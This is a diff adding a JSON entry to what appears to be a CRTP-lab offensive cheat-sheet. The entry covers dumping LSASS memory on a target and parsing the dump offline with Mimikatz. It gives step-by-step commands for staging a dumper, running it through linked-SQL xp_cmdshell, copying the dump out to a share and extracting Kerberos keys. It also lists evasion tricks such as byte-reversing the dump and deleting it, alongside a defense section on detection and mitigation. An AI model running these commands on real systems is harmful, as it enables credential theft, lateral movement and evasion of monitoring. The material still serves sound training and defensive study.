@@ -1,0 +1,109 @@
+{
+  "id": "crtp-lsass-minidump",
+  "name": "Offline LSASS Minidump -> Mimikatz (sekurlsa::minidump)",
+  "command": "mimikatz.exe \"sekurlsa::minidump <dump_file>\" \"sekurlsa::ekeys\" \"exit\"",
+  "description": "Dump LSASS memory on a target, exfiltrate the dump, and parse credentials/Kerberos keys offline - so Mimikatz never runs on the victim (evades on-host AV/EDR). In CRTP this extracts keys from a remote SQL box reached through linked-server xp_cmdshell, then runs sekurlsa::minidump on the collected dump.",
+  "platform": "windows",
+  "category": "Active Directory",
+  "subcategory": "Lateral Movement",
+  "type": "command",
+  "certifications": [
+    "CRTP"
+  ],
+  "source": "CRTP",
+  "opsec": "loud",
+  "mitre": [
+    "T1003.001"
+  ],
+  "tools": [
+    "mimikatz",
+    "minidumpdotnet",
+    "Reverse.exe"
+  ],
+  "tags": [
+    "lsass-dump",
+    "minidump",
+    "credential-access",
+    "offline-parse",
+    "ekeys",
+    "crtp"
+  ],
+  "variations": [
+    {
+      "label": "Create the LSASS dump on the target (managed minidump)",
+      "command": "powershell -c \"<minidump_script> -pid (Get-Process lsass).Id -output <dump_file>\""
+    },
+    {
+      "label": "Un-reverse / repair a byte-reversed dump",
+      "command": "Reverse.exe \"<dump_file>\" \"<fixed_dump>\""
+    }
+  ],
+  "steps": [
+    {
+      "label": "Stage dumper to a share the target can read",
+      "command": "copy C:\\AD\\Tools\\minidumpdotnet.dll \\\\<share_host>\\<share>\ncopy C:\\AD\\Tools\\mini.ps1 \\\\<share_host>\\<share>"
+    },
+    {
+      "label": "Run the dumper on the target (here via linked-SQL xp_cmdshell)",
+      "command": "Get-SQLServerLinkCrawl -Instance <mssql> -Query 'exec master..xp_cmdshell ''powershell C:\\Users\\Public\\mini.ps1''' -QueryTarget <target>"
+    },
+    {
+      "label": "Exfil the dump back to your share",
+      "command": "Get-SQLServerLinkCrawl -Instance <mssql> -Query 'exec master..xp_cmdshell ''xcopy C:\\Users\\Public\\reverse.dmp \\\\<share_host>\\<share>\\'''"
+    },
+    {
+      "label": "Repair + parse offline",
+      "command": "Reverse.exe \"reverse.dmp\" \"reversex.dmp\"; mimikatz.exe \"sekurlsa::minidump reversex.dmp\" \"sekurlsa::ekeys\" \"exit\""
+    }
+  ],
+  "examples": [
+    {
+      "label": "Offline ekeys from a collected dump",
+      "command": "C:\\AD\\Tools\\mimikatz.exe \"sekurlsa::minidump C:\\AD\\Tools\\studentsharex\\reversex.dmp\" \"sekurlsa::ekeys\" \"exit\""
+    }
+  ],
+  "notes": "Dumping LSASS offline keeps Mimikatz off the victim - only a benign-looking .dll/.ps1 dumper runs there, and parsing happens on your box. sekurlsa::ekeys yields AES keys for overpass-the-hash (crtp-overpass-hash); logonpasswords yields NTLM/plaintext. The 'reverse' step un-mangles a dump that was byte-reversed for exfil. On-host alternative: crtp-credential-dumping (SafetyKatz evasive-keys). Requires SeDebugPrivilege / local admin on the target to read LSASS.",
+  "references": [
+    {
+      "title": "CRTP - Attacking and Defending AD (lab)",
+      "url": "https://www.alteredsecurity.com/adlab"
+    },
+    {
+      "title": "MITRE ATT&CK T1003.001 - LSASS Memory",
+      "url": "https://attack.mitre.org/techniques/T1003/001/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "crtp-mssql-links",
+      "note": "Linked-SQL xp_cmdshell is how the dumper reaches the deep host",
+      "rel": "prereq"
+    },
+    {
+      "id": "crtp-overpass-hash",
+      "note": "Use extracted AES keys for overpass-the-hash",
+      "rel": "next"
+    },
+    {
+      "id": "crtp-credential-dumping",
+      "note": "On-host SafetyKatz alternative when EDR is weak",
+      "rel": "alternative"
+    }
+  ],
+  "defense": {
+    "prerequisites": "Local admin / SeDebugPrivilege on the target to read LSASS. A path to run the dumper (linked SQL xp_cmdshell, PSRemoting, etc.) and a share to move the dump.",
+    "why_it_works": "LSASS holds cached credential material (NTLM hashes, Kerberos keys, sometimes plaintext). Any process with debug rights can snapshot LSASS memory to a file; because parsing happens elsewhere, no signatured credential tool executes on the victim, defeating on-host detection.",
+    "misconfiguration": "LSASS not protected (no RunAsPPL / Credential Guard); SeDebugPrivilege available to service/admin accounts; xp_cmdshell enabled on linked SQL servers; writable shares for exfil.",
+    "impact": "Recovery of NTLM hashes and Kerberos AES keys for privileged accounts -> overpass-the-hash, silver/golden tickets, lateral movement, and domain escalation.",
+    "detection": "Process opening a handle to lsass.exe with PROCESS_VM_READ/QueryInformation (Sysmon 10) from a non-security tool; creation of a .dmp file; large file copied to a share; xp_cmdshell spawning powershell; EDR LSASS-access alerts.",
+    "artifacts": "LSASS .dmp on disk / in a share; Sysmon 10 handle to lsass; SQL Agent/xp_cmdshell process tree; 5145 share write of a dump.",
+    "vulnerable_config": "# LSASS without RunAsPPL/Credential Guard\n# xp_cmdshell enabled on SQL and its links\n# Writable shares reachable by service accounts",
+    "secure_config": "# Enable LSASS RunAsPPL (RunAsPPL=1) and Credential Guard\n# Attack Surface Reduction: block credential stealing from LSASS\n# Disable xp_cmdshell; least-privilege SQL links\n# Restrict share write; monitor lsass handle opens",
+    "prevention": "Enable Credential Guard / RunAsPPL and ASR LSASS rule; disable xp_cmdshell; restrict debug privilege; alert on lsass handle access and .dmp creation. [MITRE M1043, M1040, M1026]",
+    "evasion": "Mimikatz never touches the victim (parse offline); use a managed/.NET minidumper instead of comsvcs; byte-reverse the dump for exfil to dodge content inspection; delete the dump after collection.",
+    "sources": [
+      "CRTP",
+      "MITRE T1003.001"
+    ]
+  }
+}
